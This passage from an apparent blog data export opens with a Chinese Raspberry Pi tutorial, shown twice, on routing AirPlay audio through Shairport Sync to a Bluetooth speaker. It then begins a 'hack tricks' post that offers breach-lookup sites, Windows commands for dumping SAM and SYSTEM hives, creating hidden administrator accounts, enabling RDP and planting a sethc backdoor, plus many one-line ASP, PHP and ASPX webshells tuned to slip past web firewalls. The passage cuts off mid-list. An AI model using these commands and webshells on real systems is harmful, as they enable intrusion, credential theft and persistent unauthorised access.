alt=\"\"></p>\n</blockquote>\n<p>因此这个问题可以分为两个部分：</p>\n<ul>\n<li>1.树莓派蓝牙音频配置部分</li>\n<li>2.树莓派Airplay播放部分</li>\n</ul>\n<p>在解决这个问题的时候，我走了不少弯路，错路，目前网上没有完整的这个问题的解决方案，此文目的正是填补网络空白。</p>\n<h1 id=\"原料\"><a href=\"#原料\" class=\"headerlink\" title=\"原料\"></a>原料</h1><ul>\n<li>树莓派3</li>\n<li>小米蓝牙音箱</li>\n<li>iOS设备</li>\n</ul>\n<h1 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h1><h2 id=\"树莓派安装Shairport-Sync\"><a href=\"#树莓派安装Shairport-Sync\" class=\"headerlink\" title=\"树莓派安装Shairport Sync\"></a>树莓派安装Shairport Sync</h2><p>Shairport Sync实际上是Shairport的修改版，负责让树莓派发射出稳定的Airplay，之前我一直在使用Shairport，偶然间发现这个神器，让Shairport更加稳定好用，而且加入到系统进程，开机即打开Airplay。<br>安装前请确认是否安装以下依赖包：</p>\n<ul>\n<li><code>apt-get install build-essential git</code></li>\n<li><code>apt-get install autoconf automake libtool libdaemon-dev libasound2-dev libpopt-dev libconfig-dev</code></li>\n<li><code>apt-get install avahi-daemon libavahi-client-dev</code> </li>\n<li><code>apt-get install libssl-dev</code> </li>\n<li><code>apt-get install libpolarssl-dev</code> </li>\n<li><code>apt-get install libsoxr-dev</code> </li>\n</ul>\n<p>随后下载Shairport Sync：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/mikebrady/shairport-sync.git</div></pre></td></tr></table></figure></p>\n<p>然后<code>cd</code>到相应目录，执行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">autoreconf -i <span class=\"_\">-f</span></div></pre></td></tr></table></figure></p>\n<p>随后执行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">./configure --with-alsa --with-avahi --with-ssl=openssl --with-metadata --with-soxr --with-systemd</div></pre></td></tr></table></figure></p>\n<p>如果没问题的话，可以make了，此时该去洗手间去洗手间，该睡觉睡觉：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">make</div></pre></td></tr></table></figure></p>\n<p>创建开机启动：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">getent group shairport-sync &amp;&gt;/dev/null || sudo groupadd -r shairport-sync &gt;/dev/null</div><div class=\"line\"></div><div class=\"line\">getent passwd shairport-sync &amp;&gt; /dev/null || sudo useradd -r -M -g shairport-sync <span class=\"_\">-s</span> /usr/bin/nologin -G audio shairport-sync &gt;/dev/null</div></pre></td></tr></table></figure></p>\n<p>然后运行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo make install</div></pre></td></tr></table></figure></p>\n<p>最后输入，完成安装：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo update-rc.d shairport-sync defaults 90 10</div></pre></td></tr></table></figure></p>\n<h2 id=\"树莓派安装蓝牙\"><a href=\"#树莓派安装蓝牙\" class=\"headerlink\" title=\"树莓派安装蓝牙\"></a>树莓派安装蓝牙</h2><p>打开终端，用普通用户权限执行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get updgrade -y</div><div class=\"line\">sudo apt-get dist-upgrade -y</div></pre></td></tr></table></figure></p>\n<p>随后安装蓝牙及管理软件<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install pi-bluetooth bluez bluez-firmware blueman</div></pre></td></tr></table></figure></p>\n<p>将pi用户添加到蓝牙组<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo usermod -G bluetooth <span class=\"_\">-a</span> pi</div></pre></td></tr></table></figure></p>\n<p>还有很<strong>重要</strong>的一条，安装蓝牙音频配置<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install pulseaudio pulseaudio-module-bluetooth</div></pre></td></tr></table></figure></p>\n<p>随后重启一次树莓派，开机，在图形化界面中配对蓝牙，操作比较简单，记得在配对成功后对设备进行连接，省略。<br>也可通过bluetoothctl或hictool命令进行配对。<br>随后记下蓝牙设备的地址，XX:XX:XX:XX:XX:XX格式。</p>\n<p><strong>在此步，务必通过测试音频是否能够正常与蓝牙设备通信，记得软件中要勾选蓝牙设备，否则将从3.5mm端口输出音频。推荐使用vlc播放器。</strong></p>\n<h2 id=\"配置蓝牙音频及Shariport-Sync\"><a href=\"#配置蓝牙音频及Shariport-Sync\" class=\"headerlink\" title=\"配置蓝牙音频及Shariport Sync\"></a>配置蓝牙音频及Shariport Sync</h2><p>安装依赖包：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install libdbus-1-dev</div><div class=\"line\">sudo apt-get install libglib2.0-dev</div><div class=\"line\">apt-cache search libasound</div><div class=\"line\">sudo apt-get install libasound2-dev</div></pre></td></tr></table></figure></p>\n<p>配置及重新安装最新版bluez，此刻可以去洗手间和睡觉觉：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">wget http://www.kernel.org/pub/linux/bluetooth/bluez-4.101.tar.xz</div><div class=\"line\">tar -xvf bluez-4.101.tar.xz</div><div class=\"line\"><span class=\"built_in\">cd</span> bluez-4.101</div><div class=\"line\">./configure --prefix=/usr --mandir=/usr/share/man --sysconfdir=/etc --localstatedir=/var --libexecdir=/lib</div><div class=\"line\">make</div><div class=\"line\">sudo make install</div></pre></td></tr></table></figure></p>\n<p>复制配置文件到目录：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo cp /home/pi/bluez-4.101/<span class=\"built_in\">test</span>/simple-agent /usr/bin/bluez-simple-agent</div><div class=\"line\">sudo cp /home/pi/bluez-4.101/<span class=\"built_in\">test</span>/<span class=\"built_in\">test</span>-device /usr/bin/bluez-test-device</div><div class=\"line\">sudo cp /home/pi/bluez-4.101/<span class=\"built_in\">test</span>/<span class=\"built_in\">test</span>-audio /usr/bin/bluez-test-audio</div><div class=\"line\">sudo cp /home/pi/bluez-4.101/audio/audio.conf /etc/bluetooth/</div></pre></td></tr></table></figure></p>\n<p>接着运行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install python-dbus</div><div class=\"line\">sudo apt-get install python-gobject</div><div class=\"line\">sudo cp /usr/lib/alsa-lib/libasound_module_pcm_bluetooth.so /usr/lib/arm-linux-gnueabihf/alsa-lib/</div></pre></td></tr></table></figure></p>\n<p>编辑audio.conf文件使shariport的音频从蓝牙设备输出：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo nano /etc/bluetooth/audio.conf</div></pre></td></tr></table></figure></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 在[General]区域添加:</span></div><div class=\"line\">Enable=Sink,Socket</div><div class=\"line\"><span class=\"comment\"># 取消[A2DP]注释，并加入:</span></div><div class=\"line\">Maxconnections=4</div></pre></td></tr></table></figure>\n<p>打开蓝牙自启动:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo systemctl <span class=\"built_in\">enable</span> bluetooth</div></pre></td></tr></table></figure></p>\n<p>重启设备后，继续配置，打开asund.conf文件：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo nano /etc/asound.conf</div></pre></td></tr></table></figure></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\">pcm.bt_canz &#123;</div><div class=\"line\">type plug</div><div class=\"line\">slave &#123;</div><div class=\"line\">pcm &#123;</div><div class=\"line\">type bluetooth</div><div class=\"line\">device XX:XX:XX:XX:XX:XX</div><div class=\"line\">profile <span class=\"string\">\"auto\"</span></div><div class=\"line\">&#125;</div><div class=\"line\">&#125;</div><div class=\"line\">hint &#123;</div><div class=\"line\">show on</div><div class=\"line\">description <span class=\"string\">\"Mi Speaker\"</span></div><div class=\"line\">&#125;</div><div class=\"line\">&#125;</div><div class=\"line\">ctl.bt_canz &#123;</div><div class=\"line\">type bluetooth</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>测试bluez能否使用：<code>sudo bluez-simple-agent</code>，如果正常，按ctrl+c停止。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo bluez-simple-agent hci0 XX:XX:XX:XX:XX:XX</div><div class=\"line\">sudo bluez-test-audio connect XX:XX:XX:XX:XX:XX</div></pre></td></tr></table></figure></p>\n<p>测试是否连通：<code>speaker-test -c 2 -D bt_canz</code></p>\n<p>再次重启设备。<br>开启后编辑<code>/etc/shairport-sync.conf</code>：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo nano /etc/shairport-sync.conf</div><div class=\"line\"><span class=\"comment\">#去掉下面的注释，并加入bt_canz</span></div><div class=\"line\">output_device = bt_canz</div></pre></td></tr></table></figure></p>\n<p>保存！重启！开机即可用。<br><img src=\"/content/images/2016/08/IMG_0635.PNG\" alt=\"\"></p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://github.com/mikebrady/shairport-sync/issues/200\" target=\"_blank\" rel=\"external\">https://github.com/mikebrady/shairport-sync/issues/200</a><br><a href=\"https://github.com/mikebrady/shairport-sync\" target=\"_blank\" rel=\"external\">https://github.com/mikebrady/shairport-sync</a><br><a href=\"http://shumeipai.nxez.com/2014/12/10/raspberry-pi-using-airplay-wireless-audio-playback-achieve-even-putting-wifi.html\" target=\"_blank\" rel=\"external\">http://shumeipai.nxez.com/2014/12/10/raspberry-pi-using-airplay-wireless-audio-playback-achieve-even-putting-wifi.html</a><br><a href=\"http://wangye.org/blog/archives/921/\" target=\"_blank\" rel=\"external\">http://wangye.org/blog/archives/921/</a><br><a href=\"http://blog.csdn.net/huayucong/article/details/51376461\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/huayucong/article/details/51376461</a><br><a href=\"http://blog.csdn.net/zhaoqi_0612/article/details/47731821\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/zhaoqi_0612/article/details/47731821</a><br><a href=\"http://blog.csdn.net/techtitan/article/details/6165116\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/techtitan/article/details/6165116</a><br><a href=\"http://www.eeboard.com/bbs/forum.php?mod=viewthread&amp;tid=45040&amp;page=1\" target=\"_blank\" rel=\"external\">http://www.eeboard.com/bbs/forum.php?mod=viewthread&amp;tid=45040&amp;page=1</a></p>\n","excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>最近买了小米蓝牙音响，使用一段时间后发现小米蓝牙音箱有一个极其不方便的地方就是家里苹果设备比较多，想切换设备播放的时候就比较麻烦，还要断开操作。<br>于是萌生了一个想法，正好手上有个树莓派，能不能这样：</p>\n<blockquote>\n<p>iOS设备-&gt;Airplay-&gt;树莓派-&gt;蓝牙-&gt;小米蓝牙音箱<br>","more":"<br><img src=\"/content/images/2016/08/DSC07326-5.JPG\" alt=\"\"></p>\n</blockquote>\n<p>因此这个问题可以分为两个部分：</p>\n<ul>\n<li>1.树莓派蓝牙音频配置部分</li>\n<li>2.树莓派Airplay播放部分</li>\n</ul>\n<p>在解决这个问题的时候，我走了不少弯路，错路，目前网上没有完整的这个问题的解决方案，此文目的正是填补网络空白。</p>\n<h1 id=\"原料\"><a href=\"#原料\" class=\"headerlink\" title=\"原料\"></a>原料</h1><ul>\n<li>树莓派3</li>\n<li>小米蓝牙音箱</li>\n<li>iOS设备</li>\n</ul>\n<h1 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h1><h2 id=\"树莓派安装Shairport-Sync\"><a href=\"#树莓派安装Shairport-Sync\" class=\"headerlink\" title=\"树莓派安装Shairport Sync\"></a>树莓派安装Shairport Sync</h2><p>Shairport Sync实际上是Shairport的修改版，负责让树莓派发射出稳定的Airplay，之前我一直在使用Shairport，偶然间发现这个神器，让Shairport更加稳定好用，而且加入到系统进程，开机即打开Airplay。<br>安装前请确认是否安装以下依赖包：</p>\n<ul>\n<li><code>apt-get install build-essential git</code></li>\n<li><code>apt-get install autoconf automake libtool libdaemon-dev libasound2-dev libpopt-dev libconfig-dev</code></li>\n<li><code>apt-get install avahi-daemon libavahi-client-dev</code> </li>\n<li><code>apt-get install libssl-dev</code> </li>\n<li><code>apt-get install libpolarssl-dev</code> </li>\n<li><code>apt-get install libsoxr-dev</code> </li>\n</ul>\n<p>随后下载Shairport Sync：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/mikebrady/shairport-sync.git</div></pre></td></tr></table></figure></p>\n<p>然后<code>cd</code>到相应目录，执行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">autoreconf -i <span class=\"_\">-f</span></div></pre></td></tr></table></figure></p>\n<p>随后执行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">./configure --with-alsa --with-avahi --with-ssl=openssl --with-metadata --with-soxr --with-systemd</div></pre></td></tr></table></figure></p>\n<p>如果没问题的话，可以make了，此时该去洗手间去洗手间，该睡觉睡觉：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">make</div></pre></td></tr></table></figure></p>\n<p>创建开机启动：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">getent group shairport-sync &amp;&gt;/dev/null || sudo groupadd -r shairport-sync &gt;/dev/null</div><div class=\"line\"></div><div class=\"line\">getent passwd shairport-sync &amp;&gt; /dev/null || sudo useradd -r -M -g shairport-sync <span class=\"_\">-s</span> /usr/bin/nologin -G audio shairport-sync &gt;/dev/null</div></pre></td></tr></table></figure></p>\n<p>然后运行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo make install</div></pre></td></tr></table></figure></p>\n<p>最后输入，完成安装：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo update-rc.d shairport-sync defaults 90 10</div></pre></td></tr></table></figure></p>\n<h2 id=\"树莓派安装蓝牙\"><a href=\"#树莓派安装蓝牙\" class=\"headerlink\" title=\"树莓派安装蓝牙\"></a>树莓派安装蓝牙</h2><p>打开终端，用普通用户权限执行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get updgrade -y</div><div class=\"line\">sudo apt-get dist-upgrade -y</div></pre></td></tr></table></figure></p>\n<p>随后安装蓝牙及管理软件<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install pi-bluetooth bluez bluez-firmware blueman</div></pre></td></tr></table></figure></p>\n<p>将pi用户添加到蓝牙组<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo usermod -G bluetooth <span class=\"_\">-a</span> pi</div></pre></td></tr></table></figure></p>\n<p>还有很<strong>重要</strong>的一条，安装蓝牙音频配置<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install pulseaudio pulseaudio-module-bluetooth</div></pre></td></tr></table></figure></p>\n<p>随后重启一次树莓派，开机，在图形化界面中配对蓝牙，操作比较简单，记得在配对成功后对设备进行连接，省略。<br>也可通过bluetoothctl或hictool命令进行配对。<br>随后记下蓝牙设备的地址，XX:XX:XX:XX:XX:XX格式。</p>\n<p><strong>在此步，务必通过测试音频是否能够正常与蓝牙设备通信，记得软件中要勾选蓝牙设备，否则将从3.5mm端口输出音频。推荐使用vlc播放器。</strong></p>\n<h2 id=\"配置蓝牙音频及Shariport-Sync\"><a href=\"#配置蓝牙音频及Shariport-Sync\" class=\"headerlink\" title=\"配置蓝牙音频及Shariport Sync\"></a>配置蓝牙音频及Shariport Sync</h2><p>安装依赖包：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install libdbus-1-dev</div><div class=\"line\">sudo apt-get install libglib2.0-dev</div><div class=\"line\">apt-cache search libasound</div><div class=\"line\">sudo apt-get install libasound2-dev</div></pre></td></tr></table></figure></p>\n<p>配置及重新安装最新版bluez，此刻可以去洗手间和睡觉觉：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">wget http://www.kernel.org/pub/linux/bluetooth/bluez-4.101.tar.xz</div><div class=\"line\">tar -xvf bluez-4.101.tar.xz</div><div class=\"line\"><span class=\"built_in\">cd</span> bluez-4.101</div><div class=\"line\">./configure --prefix=/usr --mandir=/usr/share/man --sysconfdir=/etc --localstatedir=/var --libexecdir=/lib</div><div class=\"line\">make</div><div class=\"line\">sudo make install</div></pre></td></tr></table></figure></p>\n<p>复制配置文件到目录：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo cp /home/pi/bluez-4.101/<span class=\"built_in\">test</span>/simple-agent /usr/bin/bluez-simple-agent</div><div class=\"line\">sudo cp /home/pi/bluez-4.101/<span class=\"built_in\">test</span>/<span class=\"built_in\">test</span>-device /usr/bin/bluez-test-device</div><div class=\"line\">sudo cp /home/pi/bluez-4.101/<span class=\"built_in\">test</span>/<span class=\"built_in\">test</span>-audio /usr/bin/bluez-test-audio</div><div class=\"line\">sudo cp /home/pi/bluez-4.101/audio/audio.conf /etc/bluetooth/</div></pre></td></tr></table></figure></p>\n<p>接着运行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install python-dbus</div><div class=\"line\">sudo apt-get install python-gobject</div><div class=\"line\">sudo cp /usr/lib/alsa-lib/libasound_module_pcm_bluetooth.so /usr/lib/arm-linux-gnueabihf/alsa-lib/</div></pre></td></tr></table></figure></p>\n<p>编辑audio.conf文件使shariport的音频从蓝牙设备输出：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo nano /etc/bluetooth/audio.conf</div></pre></td></tr></table></figure></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 在[General]区域添加:</span></div><div class=\"line\">Enable=Sink,Socket</div><div class=\"line\"><span class=\"comment\"># 取消[A2DP]注释，并加入:</span></div><div class=\"line\">Maxconnections=4</div></pre></td></tr></table></figure>\n<p>打开蓝牙自启动:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo systemctl <span class=\"built_in\">enable</span> bluetooth</div></pre></td></tr></table></figure></p>\n<p>重启设备后，继续配置，打开asund.conf文件：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo nano /etc/asound.conf</div></pre></td></tr></table></figure></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\">pcm.bt_canz &#123;</div><div class=\"line\">type plug</div><div class=\"line\">slave &#123;</div><div class=\"line\">pcm &#123;</div><div class=\"line\">type bluetooth</div><div class=\"line\">device XX:XX:XX:XX:XX:XX</div><div class=\"line\">profile <span class=\"string\">\"auto\"</span></div><div class=\"line\">&#125;</div><div class=\"line\">&#125;</div><div class=\"line\">hint &#123;</div><div class=\"line\">show on</div><div class=\"line\">description <span class=\"string\">\"Mi Speaker\"</span></div><div class=\"line\">&#125;</div><div class=\"line\">&#125;</div><div class=\"line\">ctl.bt_canz &#123;</div><div class=\"line\">type bluetooth</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>测试bluez能否使用：<code>sudo bluez-simple-agent</code>，如果正常，按ctrl+c停止。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo bluez-simple-agent hci0 XX:XX:XX:XX:XX:XX</div><div class=\"line\">sudo bluez-test-audio connect XX:XX:XX:XX:XX:XX</div></pre></td></tr></table></figure></p>\n<p>测试是否连通：<code>speaker-test -c 2 -D bt_canz</code></p>\n<p>再次重启设备。<br>开启后编辑<code>/etc/shairport-sync.conf</code>：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo nano /etc/shairport-sync.conf</div><div class=\"line\"><span class=\"comment\">#去掉下面的注释，并加入bt_canz</span></div><div class=\"line\">output_device = bt_canz</div></pre></td></tr></table></figure></p>\n<p>保存！重启！开机即可用。<br><img src=\"/content/images/2016/08/IMG_0635.PNG\" alt=\"\"></p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://github.com/mikebrady/shairport-sync/issues/200\">https://github.com/mikebrady/shairport-sync/issues/200</a><br><a href=\"https://github.com/mikebrady/shairport-sync\">https://github.com/mikebrady/shairport-sync</a><br><a href=\"http://shumeipai.nxez.com/2014/12/10/raspberry-pi-using-airplay-wireless-audio-playback-achieve-even-putting-wifi.html\">http://shumeipai.nxez.com/2014/12/10/raspberry-pi-using-airplay-wireless-audio-playback-achieve-even-putting-wifi.html</a><br><a href=\"http://wangye.org/blog/archives/921/\">http://wangye.org/blog/archives/921/</a><br><a href=\"http://blog.csdn.net/huayucong/article/details/51376461\">http://blog.csdn.net/huayucong/article/details/51376461</a><br><a href=\"http://blog.csdn.net/zhaoqi_0612/article/details/47731821\">http://blog.csdn.net/zhaoqi_0612/article/details/47731821</a><br><a href=\"http://blog.csdn.net/techtitan/article/details/6165116\">http://blog.csdn.net/techtitan/article/details/6165116</a><br><a href=\"http://www.eeboard.com/bbs/forum.php?mod=viewthread&amp;tid=45040&amp;page=1\">http://www.eeboard.com/bbs/forum.php?mod=viewthread&amp;tid=45040&amp;page=1</a></p>"},{"title":"那些Hack神器及奇技淫巧","date":"2016-09-11T22:07:28.000Z","_content":"# 简介\n这里会总结一些Hack经验，都是我日常使用的，会长期更新，渗透测试专用，请勿挪作非法用途。\n\n# 那些网站\n## 社工库\n\n### 国内\n\nhttp://www.findmima.com/\n\nhttp://www.wghostk.com/so/\n\nhttp://p.08lt.com\n\nhttp://www.144118.com/\n\n### 国际\n\nhttps://haveibeenpwned.com/\n\nhttps://leakbase.pw/\n\n## C段\nhttp://www.144118.com/\n\n## whois查询\nhttp://whois.domaintools.com/\n\n## 历史页面\n\n# 那些实用命令\n## reg导出sam\nreg save hklm\\sam sam.hive\n\nreg save hklm\\system system.hive\n\nreg save hklm\\security security.hive\n\n## Windows新建用户\nnet user admin$ admin /add\n\nnet localgroup administrators admin$ /add\n\nnet user Guest 1234\n\nnet user Guest /active:yes\n\nnet localgroup administrators Guest /add\n\n## 打开3389(2003,xp)\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\n\n## sethc后门\nCopy C:\\windows\\explorer.exe C:\\Windows\\System32\\sethc.exe /y\n\n## mssql xpcmdshell报错\nEXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;\n\n# 那些一句话\n\n## asp一句话木马\n```\n<%eval request(\"x\")%>\n```\n\n## php一句话木马\n```\n<?php eval($_POST[g]);?>\n```\n\n## aspx一句话\n```\n<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"x\"],\"unsafe\");%>\n```\n\n## 数据库加密一句话(密码a)\n```\n┼攠數畣整爠煥敵瑳∨≡┩愾\n```\n\n## 网站配置、版权信息专用一句话\n```\n\"%><%Eval Request(x)%>\n```\n\n## 一句话再过护卫神\n```\n<%Y=request(\"x\")%> <%execute(Y)%>\n```\n\n## 过拦截一句话木马\n```\n<% eXEcGlOBaL ReQuEsT(\"x\") %>\n```\n\n## asp闭合型一句话 \n```\n%><%eval request(\"0o1Znz1ow\")%><%\n```\n\n## 能过安全狗的解析格式\n```\n;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg\n```\n\n## 突破安全狗的一句话\n```\n<%Y=request(\"x\")%> <%eval(Y)%>\n```\n\n## elong过安全狗的php一句话\n```\n<?php  $a = \"a\".\"s\".\"s\".\"e\".\"r\".\"t\";  $a($_POST[cc]);  ?>\n```\n\n## 后台常用写入php一句话（密码x）\n```\n<? \n $fp = @fopen(\"c.php\", 'a'); \n @fwrite($fp, '<'.'?php'.\"\\r\\n\\r\\n\".'eval($_POST[x])'.\"\\r\\n\\r\\n?\".\">\\r\\n\"); \n @fclose($fp); \n ?>\n```\n \n## 高强度php一句话\n```\n<?php substr(md5($_REQUEST['heroes']),28)=='acd0'&&eval($_REQUEST['c']);?>\n```\n\n## 新型变异PHP一句话(密码b4dboy)\n```\n($b4dboy = $_POST['b4dboy']) && @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);\n```\n\n## 